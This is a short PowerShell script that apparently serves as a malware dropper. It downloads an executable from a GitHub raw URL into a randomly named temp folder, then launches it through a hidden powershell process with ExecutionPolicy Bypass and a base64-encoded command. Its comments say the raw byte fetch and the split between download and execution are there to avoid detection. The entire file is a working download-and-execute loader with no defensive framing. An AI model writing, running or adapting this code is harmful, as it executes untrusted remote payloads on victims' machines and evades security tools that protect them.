# s1.ps1 — fetch the payload, hand off exec to a detached child, exit.
$u = 'https://raw.githubusercontent.com/westoakstudios/y/main/boot_1791736788567.exe'
$d = Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'))
ni -ItemType Directory -Force -Path $d | Out-Null
$p = Join-Path $d ([guid]::NewGuid().ToString('N') + '.exe')

# raw byte fetch, no DownloadFile token
$b = (New-Object Net.WebClient).DownloadData($u)
[IO.File]::WriteAllBytes($p, $b)

# hand off to a fresh powershell that only does the exec — this is the split
$cmd = "Start-Process -FilePath '$p' -WorkingDirectory '$d'"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
Start-Process -WindowStyle Hidden -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$enc | Out-Null
